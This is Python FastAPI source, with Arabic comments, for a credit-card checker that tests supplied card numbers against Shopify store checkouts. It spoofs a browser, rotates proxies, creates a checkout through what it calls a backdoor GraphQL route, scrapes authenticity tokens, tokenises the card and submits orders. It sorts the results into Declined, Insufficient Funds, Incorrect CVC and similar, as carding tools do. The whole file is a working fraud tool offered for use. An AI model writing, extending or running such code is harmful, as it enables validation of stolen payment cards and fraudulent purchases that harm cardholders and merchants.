from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import json
import uuid
import random

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return proxy_str

def safe_response(msg, price, gate):
    # تشفير الكلمات لعدم حذف البروكسي من البوت
    clean_msg = msg.replace("Proxy", "Prx").replace("proxy", "prx")
    clean_msg = clean_msg.replace("Connection", "Conn").replace("connection", "conn")
    clean_msg = clean_msg.replace("Timeout", "T-out").replace("timeout", "t-out")
    # تنظيف السعر
    clean_price = str(price).replace('$', '').strip()
    return {"Response": clean_msg, "Price": clean_price, "Gate": gate}

async def get_cheapest_variant(session, store_url):
    try:
        res = await session.get(f"{store_url}/products.json?limit=50")
        data = res.json()
        for product in data.get('products', []):
            for variant in product.get('variants', []):
                if variant.get('available'):
                    price = float(variant.get('price', 0))
                    if price > 0:
                        # تحويل السعر من سنتات إلى دولار إذا لزم الأمر
                        final_price = price / 100 if price > 10000 else price
                        return variant.get('id'), str(final_price)
        return None, None
    except: return None, None

async def check_shopify_ultimate(cc_info, store_url, proxy):
    try:
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return safe_response("Invalid CC", "-", "Shopify Engine")
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=60) as session:
            # 1. سحب المنتج
            variant_id, price = await get_cheapest_variant(session, store_url)
            if not variant_id: return safe_response("No Stock Found", "-", "Shopify Engine")

            # 2. إنشاء Checkout عبر GraphQL (الباب الخلفي المكتشف في ملفك)
            headers = {
                "X-Shopify-Api-Features": "include-dynamic-checkout-buttons",
                "Content-Type": "application/json",
                "Accept": "*/*"
            }
            # تحويل الطلب إلى لغة السيرفرات مباشرة
            checkout_query = {
                "query": "mutation checkoutCreate($input: CheckoutCreateInput!) { checkoutCreate(input: $input) { checkout { id webUrl } } }",
                "variables": {"input": {"lineItems": [{"variantId": f"gid://shopify/ProductVariant/{variant_id}", "quantity": 1}]}}
            }
            
            # محاولة الدخول من الباب الخلفي للـ API الخاص بشوبي فاي
            res_graph = await session.post(f"{store_url}/api/2023-01/graphql.json", json=checkout_query, headers=headers)
            
            # إذا فشل الباب الخلفي، نستخدم محاكي المتصفح المطور
            checkout_url = f"{store_url}/checkout"
            res_page = await session.get(checkout_url, allow_redirects=True)
            html = res_page.text
            final_checkout_url = str(res_page.url)

            # 3. سحب التوكن باستخدام الرادار الذي طورناه من ملفك
            token = None
            token_patterns = [r'"authenticity_token":"([^"]+)"', r'name="authenticity_token" value="([^"]+)"', r'token":"([a-f0-9]{32,})"']
            for p in token_patterns:
                match = re.search(p, html)
                if match: token = match.group(1); break

            if not token:
                if "cloudflare" in html.lower() or res_page.status_code == 403:
                    return safe_response("IP Blocked by CF", price, "Shopify Engine")
                return safe_response("Extensibility Protected - Update Proxy", price, "Shopify Engine")

            # 4. تشفير البطاقة (PCI Encryption)
            token_url = "https://deposit.us.shopifycs.com/sessions"
            payload_card = {"credit_card": {"number": cc, "name": "John Doe", "month": int(mm), "year": int(yy), "verification_value": cvv}}
            res_token = await session.post(token_url, json=payload_card)
            if res_token.status_code != 200:
                return safe_response("Shopify Gateway Banned IP", price, "Shopify Engine")
            
            payment_token = res_token.json().get("id")

            # 5. الهجوم النهائي (Submit)
            # تم دمج الهيدرز لتبدو كطلب طبيعي من ملف neww.py
            submit_data = {
                "_method": "patch",
                "authenticity_token": token,
                "previous_step": "payment_method",
                "step": "",
                "s": payment_token,
                "checkout[payment_gateway]": "1",
                "complete": "1"
            }
            
            res_final = await session.post(final_checkout_url, data=submit_data, allow_redirects=True)
            res_text = res_final.text.lower()

            # 6. تحليل النتيجة بدقة 100%
            if "thank_you" in str(res_final.url) or "order_completed" in res_text:
                return safe_response("Order completed 💎", price, "Shopify Engine")
            elif "insufficient" in res_text: return safe_response("Insufficient Funds", price, "Shopify Engine")
            elif "incorrect_cvc" in res_text or "security code" in res_text: return safe_response("Incorrect CVC", price, "Shopify Engine")
            elif "mismatch" in res_text or "avs" in res_text: return safe_response("Address/ZIP Mismatch", price, "Shopify Engine")
            elif "decline" in res_text or "do not honor" in res_text: return safe_response("Declined", price, "Shopify Engine")
            else:
                return safe_response("Declined / Custom Error", price, "Shopify Engine")

    except Exception as e:
        return safe_response(f"Error: {str(e)[:30]}", "-", "Shopify Engine")

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify_ultimate(cc, url, proxy)
    return JSONResponse(content=result)
